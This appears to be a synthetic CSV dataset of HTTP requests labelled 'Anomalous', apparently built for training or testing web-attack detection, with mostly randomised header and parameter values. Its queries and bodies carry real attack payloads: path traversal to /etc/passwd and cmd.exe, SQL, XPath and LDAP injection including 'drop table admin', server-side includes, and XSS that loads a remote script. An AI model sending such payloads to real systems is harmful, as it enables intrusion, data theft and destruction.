Class,Method,URI,Host-Header,Host,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Cookie,Pragma,User-Agent,Content-Length,Content-Type,POST-Data,GET-Query
Anomalous,GET,/28GgyB86j/fXergatgdtf2iaAro/giYJWLKaB/auia/b7teerdotatlrMk/sdcUNscstonh/sRYhl6jU24/7%uservices2shutdownXYdecopy/c@JIhtpassyil0qIk/ef_HYdoh9V5rE7l/5o3l3exsorpfacroio.jpg,HTTP/1.1,26.178.135.201,close,*/*,x-mac-japanese;q=0.6,"tialp-d6oan;q=0.6, pa-9lef, sot-asb;q=0.7, g8-fytumh;q=0.6, ii-7;q=0.5",no-transform,toa7wssnaVmennF=nwddqmSwqP;rmeZg6k=928904;sam8D93passthruAQxbg=17;387eaNdEeTic=H saesoinsert ;Pupdatelm;1secnglC7eotpmn=iLbx,nO='aegsLE',Mozilla/9.2 (compatible; MSIE 4.9; Unix; kOartns; Raouecep; brokoo),,,,YMx9kYd8L=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fleet%2Fchmaan%2Ftoliretoet%2Folveolilsi.swf
Anomalous,GET,/dnd2TntorcrESeli/dJIGBhpz/eQbgW.EaG4/bK2lpQN/c-ik/sN/1i.E@t@Qlv-I9.png,HTTP/1.1,www.mhOt3ut.org:80,close,"application/*, video/*","cp-932, iso-8859-8, x-mac-arabic, euc-jp;q=0.4, iso-8859-6;q=0.2",nqTntew-aeim,min-fresh=242,iEri=mp7iMiaran1e,no-cache,eAGorn http://www.ye4z0nam.net,,,,eantysieLott=dte&r5DwiUss=4&rcxrdettmhlahmh=c&nEdulNm=isetc&ttiatttseq=ohtau+++style%3Dleft%3Aexpression%28alert+%28is8h8s.RTs%29%29&nlenl9m=n&W@k25_cdeleteOhtaccesxP=4926198&-H9Wtpsc-@=704
Anomalous,GET,/2@zH/alt7OltoAii.css,HTTP/1.1,103.65.94.122,o2tra0e,"audio/*, text/plain;q=0.8",*;q=0.1,*,max-age=40,imlta=57078;noceAettlE=2706995688;avegvyan=elsg7i;oy=uIzi;nsurle=t;adgfrsdaeicd4rh=45749,no-cache,Mozilla/3.3 (Windows; U; Win 9x 9.4; gO-tU; rv:8.9.4) Gecko/46661950,,,,to=yrcNditsdwop1&nse=oS4er-eeb&ltssrskl=447&JMdeleteuyqs=%3Cdiv+style+%3D+++%22++++binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.arsi.com%2Fscript%2Fadaccs.bin%5D%29%3B+%22++%3E&TtjbI8e=alikeS%3E&6Zfc2KI=adRiiJAsm&xZyH8@QC=tietc&er=9066582&UHXe=i%3ARat+sy&noihrsr3=wsxobjectsvbitw&VNdmei=sotlehspbh9o%3E1&h3hct3eooouiQtn=Bsoiieaisoek
Anomalous,PUT,/o8XbL/my@KXYsp32_Jp75jG/mdqjsNz2r_un4HmMG/Bi/Gfg0vI92phpJ/isR/9oQRtnnoewpnaexrYeen/HLiIealrsmnhui4lPnr.gif,HTTP/1.0,39.88.251.74:80,keep-alive,"text/html, image/png;q=0.3, application/*;q=0.0",*;q=0.2,"nmm8-Pnt;q=0.2, ae-7;q=0.7, hc-etute;q=0.4, ramrwte-a, hopa-6u86wc;q=0.3",no-store,huuae=bosexect;cat7rVha4=taem t6 T3;@Wx0c=~6techoleisucst0insertrIhttpsalr;Eorr= ie tshobhcV,tdc6t8te='d',Mozilla/2.7 (Windows; U; Win98 0.6; te-h1; rv:9.5.4) Gecko/80304493,307,application/x-www-form-urlencoded,BeFfAaccess_logXgslike=nsir5s/eRwr4/ae/child::node()[  position()=463] |    ridhe/tsm/5abpe/child::text()[position()=7]     or     'ncj' ='&dslSiiXrfxi5c=n+e39ore&@rnimg1IPsX5X= rut&crm0enfluetans1=nsinputtbeftpta&7rt2rfveydpcw=8099&cataCo8dx8=304,
Anomalous,GET,/5BsAox/sd3evi/aux/fDNaccess_logQh@Iflnetcat/Psaifspitov3/bTia.cfm,HTTP/1.0,133.162.91.6,close,"text/*, application/*;q=0.1",iso-8859-1;q=0.3,"rtaAa-nvcece;q=0.2, Wlnrt-nyuf9, 7-r;q=0.3",no-cache,fhF3ZTjs=hia,no-cache,Mozilla/8.7 (Machintosh; U; PPC Mac OS X 3.2; dA-dR; rv:8.2.6) Gecko/50189695,,,,6l=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&q6K97O=181305&abt=yhlxelcsur
Anomalous,GET,/HU/8NWlICMtmpB-32DRo/te/dOl5BEH/esdrcWeAhrnneisda/opetecitrC1dtnukkp5e/u5DdropU.gif,HTTP/1.0,www.nwuNonyt.fr:80,close,application/zip;q=0.0,*;q=0.1,*;q=0.2,no-cache,4gleyt=704144;dakdLrteierab=tO5,no-cache,Mozilla/6.9 (Machintosh; U; Mac OS X 6.6; ae-ew; rv:6.1.7) Gecko/97863327,,,,rmNiywarre=2H%7C4e&ot7saaheeun6=iklwsGf&eDcno=69456&e1aweh1w9drer4S=aaidm%29%28%26%28objectClass++++%3D++osx*%29&Z1iiFOaY2W=%7C&TStFIGOLobjectt=+0a0ns8+es7&iIxoseetr7=8&nanr2jlotej1=tithGyLt%7C+s%24nrlnxoJ&eehmsp=qsDou4
Anomalous,GET,/t9DaELnu3PVnullE/ghotede/xQiuL2dJXKThVUXkS/tDlXpR/ETx2GinGFFmVUD./twla11LePiIUao/ohmeutIJeeainp/oie2eyctstb8cero/aina/1rpZkd3QcVQQkGE.mspx,HTTP/1.0,98.243.200.197:1,close,"image/png;q=0.0, video/mpeg","hz-gb-2312, windows-1250;q=0.7, x-mac-roman",*,no-transform,fotThYlbs=o9otySnW;sexrBwjtOciN=childitdyF;inhxmara=Tota;e4ElpaRn=90492,no-cache,Mozilla/5.5 (Windows; U; Win 9x 9.8; 7E-ee; rv:0.5.2) Gecko/69210341,,,,vip1mnxhde=Hstj&5l3LT8=2I80pXsU7sQ%40&JiKdivpV@=643&a6Sbaniws=optDealnbEetn0&giigkt4Gora=..%2F..%2F..%2Farront%2Fadmin.txt&zMIl=966&sh3=q6fisapynteD&sbixmhanu4jwoRl=+%27E%24funion%5Bmenctprocessing-instructionstyleo+&8teeaphcNpm=9376&ydefcfsgq=6999286&ohdt2ea=tlink%7C&eipast3dhqdk=48582508&Io3n0desrr6pd=984519&Mj.httpC=gEh1l2jwe&ylDmochaAan_K_=sercximg3s
Anomalous,GET,/sgtslm4f1stbvirx/rd19@8SsUb8bVGwo.X/p9tOiss/5r4ose3uutrarhc5/6n_TAEroOfy1BM/b1DXTORZlJ1Mno/ej/nScDR@@.gif,HTTP/1.0,61.108.239.55,keep-alive,"application/*;q=0.4, text/html;q=0.3",*;q=0.1,,max-stale=63,llreIpfiw=02806;NoNDd=4n']     |  P  |   ://user[   name/text(    )    = 'irtHi;lSzrettehd=7dobew;eny0mnfls=eW1F,,sGl9qe http://www.nNee.be,,,,
Anomalous,GET,/oNfplmmf9e0absrO0LN/l1354HG5h5g/AFeallZgKw/LQ3positionqOI3P4Ck%u/vut.cfm,HTTP/1.1,142.18.189.91,keep-alive,text/plain,*,"Oenetd-eri;q=0.0, eTzenBej-Irsk4aw;q=0.1",no-store,ONU4DdFhtaccesIg=0es;rohomm7=tOV2,robMf='esns',mC6KbL9IyG http://www.9hdsdrfr.net,,,,Ws.tbetweenWcLNGs=7248618&hc=nl+r&dhrerkt3thmsn=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&IvCUZBcmail_R3z=eiyOyLOvyLov&eggi=9874&YWEpositionvqZvlnLftp=34&clhyms6an5=iJA9i.%40f&sxgfkeHy=6339598281&Rn=nOWkR&nkrli2ksker=6E89_p2%40XC9&odrenEeaei=a42UbXz
Anomalous,PUT,/absmkzoeie1sn/semRoyllttOdoan/eH-I02_5jQFfRqPPTJQP/tmpX0orm3nullPrkj/ahirsf3nna1.js,HTTP/1.0,157.61.136.197,close,"audio/*;q=0.8, video/*;q=0.2, video/*;q=0.8","windows-1255;q=0.0, euc-tw;q=0.9, iso-2022-kr, x-mac-chinesesimp, x-mac-arabic;q=0.1",*,only-if-cached,ihnte1afytgnrlH=rygo@yvC55J;qNsu4ramn=76182;DlovanzceGmneia=8,no-cache,orln7erorzrrbr,108,application/x-www-form-urlencoded,M2ftpa=LtntT+t Tt&qR=|h &tgNDd=4&ratabnrtMjlj=1&midscqbche=92609383&odh85s=';     drop  table  admin,
Anomalous,GET,/qTmfwiwXDSvQeSqi/2LfDuD/iImhevsnsseen/wx6PlbEa5/zo/Ko/dBierd7emxtrxhdrooi/itZJA-4bcgy5E3AI9-/svgpbgsoundsUzX1O3/kdKkNl.RSNvDcZ/Tmn/drvninTatSOorus.tiff,HTTP/1.0,233.93.189.85,elpoay,*/*;q=0.6,"iso-2022-kr;q=0.8, x-mac-icelandic;q=0.8","odoajo57-noNrdo3;q=0.1, ae7-njrDplV3;q=0.4, dC6tonas-ucte, otphdo7-sLe;q=0.5",no-store,,,gmeOeisle8dZ9eoeo,,,,lbkiframecpasswd=eb&Mc5=eh%3Bnprocessing-instructionunionerditedhr8m&hpaii06li9linm=645&9tySeELra=38068313&h3=%7Eu5niaSm&tfp=%7Et&nnoc=EeasgtaAn&rrRu=uswd&nigadiR=h9FVlL7hZv8&Syrwue7tkt=8ex&hrt5=%3C%21--++%23include+++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22++--%3E&hWrliac6on=uueLnu&pkOP2ZnanErxt=Ecwuphpohnsystem
Anomalous,GET,/adQUjsoga3nedbeIo/4andm6U/CizqTDeisanperc4oes/ogYE4/oU86b-zvfaqo1/fslrg1npso.swf,HTTP/1.1,194.157.159.24:92,close,*/*;q=0.7,"iso-2022-jp;q=0.8, iso-8859-8;q=0.8, x-mac-roman, iso-10646-ucs-2;q=0.6, ks_c_5601-1987","eya-eniksrO, u9oic-featst;q=0.1, g-1r9d5i;q=0.7",min-fresh=6892,_CYgxs=2;eIC1=e2WDLt;Yraon=8;m1gg=ftB;ds8pare74kdsed=6QvN3,alyocs='Taphns',Mozilla/2.4 (compatible; Konqueror/1.8; Win 9x; bobl8ptc),,,,oev8a2tFktr=yho8onlthib&Xsziafs2oevbH=%28i++++%3C+++++count%28d8sd5e%2Fchild%3A%3Atext%28%29%29+and+++j++++%3C+++count%28rhabi%2Fchild%3A%3Acomment%28%29%29+and+k+++++%3C+++++count%28or1%2Fchild%3A%3A*%29++++%29&nBuysufEmcizrsf=gjxKHyY&eoh3orinJy=qwcpngJ
Anomalous,GET,/bgsoundW_evalYservicesC78/nS5EmhQCxaqtr6Jk0/hOIM483SdsTgKIn/0p1esx/TXDBUbX6.gif,HTTP/1.1,44.55.198.197,close,*/*;q=0.4,*,"nde2er-nnroLdo7, e8gili9-Z;q=0.1, 6a-v9rtl, nX-d",tnor=ahld6,nfaivEz1taus=p6ZSnPUJ-cUl;CobjectrkAposition2HdRLnull=8;eLra5dbynvm=veea$0tc'srtn\\ovh?Ii;xieamnsadukxtn=gREtdSreplaceoreooegEt'oi;9eadzei=gfa,tstnolIf=1qmnm,Mozilla/0.1 (Windows; U; Windows NT 3.0; lt-tc; rv:3.4.9) Gecko/48672112,,,,pcnoamrnuan=io%27+++or+++++count%28++++path%2Fchild%3A%3Anode%28%29%5Bposition%28+%29%3D%28%28++i++++%2Bj%2B+++k++%2Bl++++%2B+++1%29%5D++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+%271nd%27+%3D++++%27+ficH%27+++or&fekrp=+p&iYahone=416716&home-Wscriptv=%5Bw&aaeebaien=qt+npluntea&iwe=hwhereedi&zuenatwma=818047&oxbja7p5uju=aaKEGx5w1GS
Anomalous,GET,/mzwLnJ2fASlG-d/aRi0WMzOZ1aH-7yO/g5ZAEPZ8C/ejGwQ/sigTt/t0/kQgvpKH1on/qeafat8alusetmji/ieowu9wdtbiyop/ret.css,HTTP/1.0,148.77.76.156,keep-alive,"text/*, image/jpeg;q=0.4, application/postscript;q=0.1",*,*,max-age=12524,csTJees=ms nandfT$passwdoet rIhE;Ee0hoe=h0UiFFJ1;ia5tl=oA1vcTLjQ6Vr,no-cache,sneg/9.0.3.1,,,,asOlxyttda=2635265&C-t3l72e0=%27+++++group++by+++users.id++having+619%3D619&AioOeoee=cwe&ntaaije=ro%7Crajpsi&q1ktlihsotc=ybelim7ilot1fnshne&hcdAe5n0et9=efShiso
Anomalous,PUT,/r0rr/nW3Qc.css,HTTP/1.1,9.165.146.199:1,close,*/*;q=0.0,*,"l-sx, ss-A;q=0.2, ileelY-40tj",only-if-cached,LRrvarVdOO=n;gtP=651976;RYdKBe=35;H6e@B.PJ=1lTh6mh,no-cache,ss8o (hgBQGNhpx; m6uMTSnN7R; iDw-ekoB),373,application/x-www-form-urlencoded,9cl=ye;croeehadkwh0&8obwjetdueqo=X h&wae9Ntetr=teeaft4hencdcor&ito=kn8elo&ubiad=Dee'    or     hfst/aC/child::node()[processing-instruction()=287] or    'ehm7aTjd'    =    '&B@VQFXb28U.@=25&oli=dI2fm_pICZ3V&dneomneeoebi=48&l1tGTNaeaaul=eY9H&nashdinmnt=7806&eaoenr7e0nfd=729&.UzrzBc8_Po=oYHALdZdBY&ci38ocgahphtb=e9tonp&upAerrixfoen7at=Di/,
Anomalous,GET,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.1,www.seIieo.st:9930,close,*/*,*;q=0.9,*,max-stale=75,ieArhRi1dxew=7Iem;ensa3oqTphy=aevalmt;0neRnNAea;otpaTewcoradsni=6prfttnsts)iwgincluden3e;ftdacuuacn=d;zb5j;erMdebQpr5tlRsr=422201547,hi='eci,aexE/5.5.5.1,,,,/c+dir
Anomalous,GET,/ahsellAf1gAn/f5cRKtJ_R4R/romgnDeiaRawe/1F8OX9Vou8Q8Hj/ccdt/o9Y/nTWEeWX5-J@qnCXiWkm/jksagneTeUnsH/ropBM.KvUl.jpg,HTTP/1.1,114.215.115.87,close,text/plain;q=0.5,iso-8859-7,*,no-transform,sss=68vgur;6uAcQfFyP=./.././../,t2tu='abg',Mozilla/1.8 (compatible; Konqueror/6.5; Linux i386; eiam; dri9vn6knu; eercNtta),,,,ih=q2sey60mli&H.E29qhtaccesjYselect=mtrmfixpn&uotiebl1sepreda=021109551&gobra6kTuat0o=gsnnttnni&lyteeo=hd4mlci&uonatulr=einsertrh2rlc%3Aupdatenode&1oen8ter5f=mHvNZCJq&irx4=n&ac=eCk&3cl0nsemtmqel=eehacsn%25r%25c%7E&ym0st6usy8mteaf=snfagee&eenrtlrne=c%28oea
Anomalous,GET,/Oarhsd/eCGE/xK/5EW_m3ESpUgtYU/rmmiasl9Wrifx/dec5wqaj/aBG2-cSOEKn2XmV/enksiX3nlhn8yrl/DRxbuselectbi6xq.msf,HTTP/1.1,www.fjwweisrf.gov:43,close,*/*;q=0.1,*,*;q=0.8,aua=thi7whli,.ghtaccesloK=024687350,leomi='oihlabna',e7wee/7.1,,,,dk=7007271&t5emruoi=514366&st8sot8tntai=tineeee&aaatl3xwtsdm=ohs&6ReItG1wboeh6=90&6rREcbtojEsser=i5-gs&iOeottiDIhdgt=368024&wr=%27+union+++select++%40%40version%2C1%2C1%2C1--&opoTph=iiee&3heaowe4vnaoo=nmutp&mts5h=coE%3Ft
Anomalous,POST,/h7-rPH/bMY7H@iB.jcCXoyGHI/m26rbasldewYwvOo/ep8irb/wV.php,HTTP/1.1,27.207.50.106:80,close,*/*,*;q=0.1,"eLlArne-lroorti;q=0.7, autbOeso-n;q=0.2, 4aY0ot-oeg8iea;q=0.8, 4tuexH1-lue8taee",min-fresh=08,WDcopyfD-=xM9W_LgrH,oy9af='rpnA',)    (   | (e9e=enlja*),15,application/x-www-form-urlencoded,esry=aWEmBJZw4.,
Anomalous,POST,/dd2tuees8obdlhpu/Iudnlda/tnDHrlcnuV/lnqtucd2e/oe4ns/nair/a0hai.tiff,HTTP/1.1,www.oo0o4Os.be,fgrwt,*/*,"euc-kr;q=0.9, big5, x-mac-arabic, iso-8859-5;q=0.7, x-mac-greek;q=0.1","7me-gh7soaas;q=0.9, jovcem-4e, hirdr-as, eet5v8c-ata0eo0n;q=0.3, a-eards;q=0.8",no-store,u4AeaWlt=3aiadnaof;Anfc8SsToem=tkehuro;Nme9dhtOnrrl8nJ=:d6hnc zbvtdtdw;1rnusghmYnaTi=6180808;8Qp9RUfIUbetweenf=in;C1r5zand79mtb=+techo,hraiaGt3='rann',nhogAfNt (tzbBRWUL1; tgFWjJG-; iuMqT833; lGEJK3n; dv9qCPyP),156,application/x-www-form-urlencoded,do=;alter  table leolchtane    set password    =    '8tIe'    where   name    =   'yeif';&3gmstlk4hae2=715256&a5jhtt4yAI=719&8Hl6lijG=nQeEYt,
Anomalous,GET,/lprda9drrnqolph/kn/ramu5ho4l4mA8r/octtcug/mFITIDfVFtcc6./hitrugeds/tpSDTDK.4T3yv8.0tiI.nsf,HTTP/1.1,199.25.132.84,keep-alive,*/*;q=0.4,"iso-8859-15;q=0.1, koi8-r, iso-8859-8-i",*,no-transform,snevOhqnc0wm=itHirhsrahttpseui;3nhoc65by=hn2YgII;Umt=7439213969;irlpm8tcIcptrpr=dzo4;lfshixa=1ltd ERk,no-cache,iwnc/9.8.8.3.0,,,,o4eeOitgrecjtkl=83&pephdt=tceeyt&EIsoaeuabdi=ulZ2nEiod&aii=documenthtacces&gftws0sltr=+o6&a3mOo42issrtu=9657&3Easetnd=481&hrtasionasiuuz=6ebpE8crE6n14loteu&aeogc=e+&gtmirimi=ttr%5DoMoTbte%7Eeupdatesystemfe4c&hthdl=3sv&iesnle=sgl%29%28%26%28objectClass+%3D+++isei*%29&u9ga=rsRVt%40N&egsl8eatisent=l4nwp-%3Chuoeno5lEjf0jg6
Anomalous,GET,/1seewdddne/ZkoAprocessing-instruction@re5op/Dhm3/9zAn.fm/Krb6/h4AMN8r_hY55hKwOB_/slW_lXex/QUHFecho..php,HTTP/1.0,www.erXbutte.st,close,text/*,"gb2312;q=0.7, x-mac-greek;q=0.2, windows-1254",*,no-cache,,no-cache,Mozilla/0.8 (Windows; U; Win98 4.1; Yg-et; rv:7.9.9) Gecko/83069758,,,,ueeRtaN7g=942&isef7igcaG=1dDoden2%5Di&ssTexecb=amsfdRodo%3Dlvaro8n%7Ca+5&locationvcwU-Zsamv2location=718753079&5niocoueeyvjh=854&i703xtbn1iynq=4186&nCstilebetd0tn=oirthUn0esloudo&e-xtwp-kK=sFhwzRIzrl6&ed=f%40input%2B%3Ei1%3Bopkm4%3DT+&ctieh79tw3dsRd=1502521566&Tonwxnaossm=499&2sdotwiarsD=E8orietszreayge
Anomalous,GET,/rQq_RD5OwLHMbP7WaZIK/FRi-swcX5@7/ld5E@/eetCazrea/saf1_zp1t2go/uEeo2e49h/fIaVGGTeCf34w/-0/abscgdvtryfwttna/naATFr2eNUnodes/r86see/WpTmeD9.css,HTTP/1.0,157.106.83.78,umrcraw,image/jpeg,"windows-1252, x-mac-cyrillic;q=0.0","ep-eo5onDn3;q=0.9, a-Obshcmln;q=0.0, cstd-sn;q=0.2, r-5tn2uts;q=0.2",,,,ttNto/6.7,,,,hrimifotilAt=2508253&2o=uOyt5&3to3eNr=7785322&eu6oso=tZafjruU&sR6iQ5Knode=trnnws%3Df%5Dt%2Fh5trm&ahioR=%27++++%29++UNION+++++ALL+++SELECT++z9Ltt++++%2C++dai+%2C+zeoort+++++FROM+++boRbdt++++WHERE+++++t4os+++NOT+++IN+++++%28%274CUvnll%27++%29+AND+++duzeiofa++NOT+IN+%28%27iottD1dxn%27++++%29++AND+++++%27%27++++%3D+%27&yrttu=e8pwCCrAf&bnferhabfnw=stafhexTiicnsun&lHetcL.hpf=iaos
Anomalous,GET,/..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe,HTTP/1.0,www.rfieunrsir.fr:80,eivntrtt,"image/gif, image/*;q=0.4, image/png;q=0.2","iso-8859-6;q=0.9, hz-gb-2312","b-tekae;q=0.4, eKtip-eht4, lvhe-etnrrl, akun-zee4h;q=0.7",max-age=07907,peDthio=17lnd;tLi5okfRnqntfyf=stamincludecneroiBR;apUaLf=e6angsobdtstaag4;oinar=tpbBqpvUalc;herr5TYosikd=eop2,no-cache,Mozilla/7.6 (Machintosh; U; Mac OS X 4.4; nt-as; rv:4.9.2) Gecko/51641773,,,,
Anomalous,GET,/trloib5tilin2/owD12X6.VB-zCOUl/cu_7MLf2Ap9OeEdRaJ/NiOjy/psdenleE2ueep/gPUsX.cgi,HTTP/1.0,www.lowwl.fr:9,close,*/*;q=0.3,"x-mac-japanese;q=0.2, iso-8859-3",*,hea=Dmsri,UimOtoYnIe=n1;Esct=98722;fpeioidrtTrrh=ce6cvarnywget;Ieawindow.open=shutdown+9rt,no-cache,Mozilla/9.9 (Windows; U; Win 9x 9.4; 0t-os; rv:7.1.9) Gecko/76358121,,,,imgbo-K@xZdW=tnpp&QVc@=8Ehto&EaEEtEgdis=thxoo8n&aaaeo1sslic=ra&6tbaI6ca=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&V60Nr4D6=n6H&qj8y3=1989&Rca=fng&1niaceenxleA=tui
Anomalous,GET,/isnrbtocmrrTdhab/cGQ/Q-OZ.4S/bXbm6xmVUVFyPR7.pl,HTTP/1.0,www.s6ucnxer7.de,keep-alive,*/*;q=0.1,"iso-8859-15, windows-1258;q=0.3","utn-itw;q=0.7, fa-amiqbrs;q=0.2, cxmanfn-8ectw;q=0.5, heorlao-sistd2Q, roate-a2ea;q=0.3",no-cache,riiTeAb=laelts;9YM7Y-voZ=201;l0ol=isKmxX,eWrw='as',Mozilla/5.9 (Machintosh; U; Mac OS X 3.0; ms-sn; rv:2.5.7) Gecko/73401237,,,,cmlzeoeshhnxTr=ef&hizTtucSas=%27%3B++insert+++++into+++++efiv+++values%28666%2C%27deGnze%27%2C%27tpatrb%27%2C0xfffff%29
Anomalous,GET,/I40sx/JuRPwXdF@Zwindow.openF1l/ena@a2fnkCK_.mdb,HTTP/1.0,129.113.188.88,close,*/*,"iso-8859-1;q=0.3, shift_jis, x-mac-hebrew;q=0.8",*;q=0.2,min-fresh=92565,onc2oof=ises/tRn8iott,uoeh='dtpc',tivhaat,,,,6fro=wutNE2eWanEW&owAnechprsmn=sbau&Dem=802143&NrGssnwe=nRmriQHBAJ3&eiutE=adminpt&umun=08756&_SoAEF.=9caseLngt&g0Hhoneamta=70756&nar=610213&uofgdSn1HnUec=3&ZBrFFDBaq9r=b%40bkEr1J.8_&ns7palcsnrbAi=exsr%2Ft72s92%2Fd%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D1%5D+or+%27ianh%27%3D+%27
Anomalous,POST,/1FbP.r4mIC7zPB-knLa/ai711tdn/hdeacajA7wahew/aexfs9herecebn6atto/eN8B@FsVZIZ/0AsG8F_/usrB_6j0sam5GyA_/p-6C01O7SDSH0ePFGR5.gif,HTTP/1.1,119.66.221.0:057,close,"application/zip, audio/*;q=0.4",iso-2022-jp;q=0.8,*;q=0.1,max-stale,rvI=9969609;acolaT=e(liD;aowriQw5iy=ermfn rcpcpdo@/ ;A;lwasc=one3en/Mnpie/1dan/child::node()[position()=931]   or   'nelc'  = ';gatCethenfnha=45309,no-cache,beH4fTnystllfnd3aaeB,117,application/x-www-form-urlencoded,ZR0zQWRBinclude=9UBmltQ5&ai=475&nop7hs07exo7a=p&epDgucnQtSl=43&8Umwrj=28607&Soms=ttCwot &k0YZBR=seavyrg2htite&he=5848,
Anomalous,GET,/tMlnEhEZ-cJVTd/cAJssV.7qntv/LlQI/KDR5UAtn7VCaprocessing-instruction./Spulocsl/5L_-documentgvbscripta._/nt/bbc/xxJw6l./ajN364.6c/idS.js,HTTP/1.0,149.147.43.203,close,"audio/x-wav, video/mpeg;q=0.2",*;q=0.3,*;q=0.7,max-stale=421,,m7mnt6tO='ox41aes',Mozilla/4.3 (compatible; Konqueror/9.4; Unix; nedneac; hetltries; rritcydgtd),,,,phestamGht=deroe2ty&rsabnwkton4lc=tdi&sen6ee4lod84ats=HnH%3Fnle%7Ceo%27n0&5QiA2a=8346717&9Iii6w=Ohn+&yrmAautoexec_JwlkiNK=3tu&Eaq=el+zT
Anomalous,POST,/swOmzP/E.mH/insertnZjaccept1.vJ-DY9/ljoOaetejwwvcrismw.swf,HTTP/1.0,0.13.107.156,close,image/gif;q=0.0,*;q=0.8,"lonx8-y, EIwN-ahioty;q=0.2, Ujr42rn3-ormn",no-store,80r7nzuealtdbu=cnetb(oyvareiframefa;ez8c=bOniidacusfokeHtiN;heoqhwyxxfoa1e=homebtifrs dek;a7t=0Teu0;lreoegT8teaxoON=sbtDEfz2Sbh,sautY6e='apoo',hHQiiVgd (a_3qS1eaW; zrG9Fn2; hb9tO2wuEj; xq43Fo; rc-QJe.),241,application/x-www-form-urlencoded,isbDhb6dsm=75597&rbrapzsy9n82aTe=di&Irbn7rrmdfid=cieMn&fdedfnaa=rhqGI&aktlbpm7a=126248676&uenrrr=asz4tsastdin6Np&zee=isaittttrtuj&istctTbozctap=701091&5tjyih=9625&osItiap=79329&liouHtrdMr=9&GQJvt=97&em3GegpNlAmmTdt=oBUj&texecCPwm=e&98wof=102,
Anomalous,GET,/stdin6v20J/H-Eimg5NK4cpCKdqh/taxildfttgabcevTos/rfqZPi-ALJdHSWhK/tCHi4Y/87l.js,HTTP/1.1,230.197.147.116:80,keep-alive,*/*,"iso-8859-7, windows-1250;q=0.6, iso-8859-2;q=0.3, iso-10646-ucs-2","t6jdadgT-eows4;q=0.9, acuflewy-oehhjtfn;q=0.5, mgat-oIt",no-store,connectRMQdZinputOI6mn=selectafroma =/urestconnectn ruoeval;n.EWG9f=insert l);hbotstohgbesing=t1.8ueswCb@;ouv=iptzC;71g=3504;se8eetnenlisMdn=uesyGhTo,Ntopth='cTr',Mozilla/7.7 (compatible; Konqueror/6.7; Solaris; Rbergsei0),,,,KD.K8Uuj=ttRG&uHmocnaoEan=tp&e4qyabsjae=%28i++%3C++++count%28Eokgi%2Fchild%3A%3Atext%28%29%29+++and+++++j+%3C++++count%28ondrpl%2Fchild%3A%3Acomment%28%29%29++++and++k++%3C+++++count%28srts%2Fchild%3A%3A*%29+++++%29&bt=Fma&Sepo=oc+strensnaedbN&if=nOnanast9lcc%296e9C&amyiarehte2lr=yidna+%7C9++%2Fcatb&eed1ien=p
Anomalous,POST,/tVOW99DNsI/window.open48yW/2dTGdIe/gdofsqavxttteos7jVuo/f7kQdLZM/4lodpadTsphs/Blhhi5oonbPDoo2lr/nuhrtrllu/JDTHbetweenZp/tr3ohpe2inqhwt/rhexhhc2peitea5w.tiff,HTTP/1.0,238.209.44.128,close,*/*,gb2312;q=0.1,*,no-store,ee3tn9s6smte8=dn8vtRbmtotah;ifnedhhotljgr=tossxilcrefn,8e='ql',Mozilla/7.2 (Windows; U; WinNT 2.8; wo-so; rv:8.7.1) Gecko/06139344,131,application/x-www-form-urlencoded,tlkie4atm6trrtI=1034&ipAHnigfy=../../../../../../../../../WINNT/autoexec.bat&Aosaaatlontb0=xrnyetcaf<se634s s,
Anomalous,GET,/scuo/tcnheetr2tdyrp/i3w5uet3ee3hieeudNt/window.openeJRfevalQbody7tO/owNureupenfibeniesu.php,HTTP/1.1,www.81orob.gov,close,*/*,*;q=0.6,*,no-store,haosmgdjnun=2Sgeisdrr;sognue=4951583;yScllknitynhe=tirp8rxneeea3bva,09ws='I0o',dV@8zsY5aY http://www.AoDS.uk,,,,evpshn6tieeewI4=3843%29%28%26%28objectClass%3Dcesc%29%28%7C%28sn++%3D+++eh%29%28cn%3DaOta+J*%29%29
